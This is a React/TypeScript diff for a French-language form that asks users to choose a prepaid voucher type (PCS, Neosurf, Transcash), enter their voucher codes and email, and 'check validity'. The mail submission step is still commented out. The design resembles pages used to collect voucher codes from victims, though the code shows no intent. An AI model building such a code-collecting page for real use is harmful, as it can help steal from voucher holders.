@@ -1,19 +1,22 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { InfosUser } from "../utils/Types";
 import { generateField } from "../utils/generateField";
 
 function SubmissionForm() {
+  const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
+  const [error, setError] = useState("");
+  const [message, setMessage] = useState("");
+  const [selectedTicked, setSelectedTicked] = useState("Pcs");
+  const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();
+
   const infosUser: InfosUser = {
-    ticket: localStorage.getItem("selectedTicket")!,
+    ticket: selectedTicked,
     ticketNumber: 0,
     ticketCodes: [],
     email: "",
   };
 
   const [user, setUser] = useState(infosUser);
-  const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
-  const [error, setError] = useState("");
-  const [message, setMessage] = useState("");
 
   // const setUserTicket = (e: any) => {
   //   console.log(document.querySelector(".selected"));
@@ -24,17 +27,25 @@ function SubmissionForm() {
   //   // setUser({...user , ticket});
   // };
 
+  useEffect(() => {
+    const htmlIe: HTMLInputElement | null = document.querySelector(".tn");
+    setHtmlInputE(htmlIe);
+  }, []);
+
+  const handleSelectedTicket = (event: any) => {
+    setSelectedTicked(event.target.value);
+    user.ticketCodes = [];
+    user.ticketNumber = 0;
+    setUser({ ...user });
+    HtmlInputE!.value = "";
+    setTicketsFieldGenerate([]);
+  };
+
   const createTicketFieldsByTicketNumber = (ticketNumber: any) => {
     const ticketField: any = [];
     for (let i = 0; i < ticketNumber; i++) {
       ticketField.push(
-        generateField(
-          localStorage.getItem("selectedTicket")!,
-          i,
-          user,
-          setUser,
-          setError
-        )
+        generateField(selectedTicked, i, user, setUser, setError)
       );
     }
     setTicketsFieldGenerate(ticketField);
@@ -53,14 +64,15 @@ function SubmissionForm() {
 
   const submissionProcess = (e: any) => {
     e.preventDefault();
-    user.ticket = localStorage.getItem("selectedTicket")!;
+    user.ticket = selectedTicked;
+    console.log(user);
     if (verifiedAllFields() === false) {
       setError("veuillez remplir tout les champs");
     } else if (!error) {
       setMessage(
         "votre requette a bien été prise en compte, verifiez votre mail"
       );
-      console.log(user);
+      //console.log(user);
       // Soumission des infos via mail................................
     }
   };
@@ -75,34 +87,50 @@ function SubmissionForm() {
 
   return (
     <div className="box form-container" style={{ height: "1000px" }}>
-      <div className="login-box" style={{width:"90%"}}>
+      <div className="login-box" style={{ width: "90%" }}>
         <h2 style={{ fontSize: "1.5em" }}> Consulter validité </h2>
-        {
-          error ? <h2
-          style={{
-            fontSize: "1em",
-            width: "100%",
-            padding: "10px",
-            margin: "0px",
-            color: "red",
-          }}
-        >
-          {error} 
-        </h2> : <h2
-          style={{
-            fontSize: "1em",
-            width: "100%",
-            padding: "10px",
-            margin: "0px",
-            color: "green",
-          }}
-        >
-          {message} 
-        </h2>
-        }
+        {error ? (
+          <h2
+            style={{
+              fontSize: "1em",
+              width: "100%",
+              padding: "10px",
+              margin: "0px",
+              color: "red",
+            }}
+          >
+            {error}
+          </h2>
+        ) : (
+          <h2
+            style={{
+              fontSize: "1em",
+              width: "100%",
+              padding: "10px",
+              margin: "0px",
+              color: "green",
+            }}
+          >
+            {message}
+          </h2>
+        )}
         <form>
           <div style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}>
-            <label
+            <label className="select-label">
+              <select
+                name="options"
+                onChange={(e) => {
+                  handleSelectedTicket(e);
+                }}
+              >
+                <option value="Pcs">Pcs</option>
+                <option value="Neosurf">Neosurf</option>
+                <option value="Transcash">Transcash</option>
+              </select>
+            </label>
+          </div>
+
+          {/* { <label
               style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}
               id="img_category_label"
               className="field"
@@ -129,14 +157,13 @@ function SubmissionForm() {
                     Transcash
                   </li>
                 </ul>
-                {/* <span style={{fontSize:'10px', color:'red',padding:'0px',margin:'0px'}}>erreur</span> */}
               </div>
-            </label>
-          </div>
+            </label>} */}
 
           <div className="user-box">
             <input
               type="number"
+              className="tn"
               required
               max={3}
               name="ticketNumber"
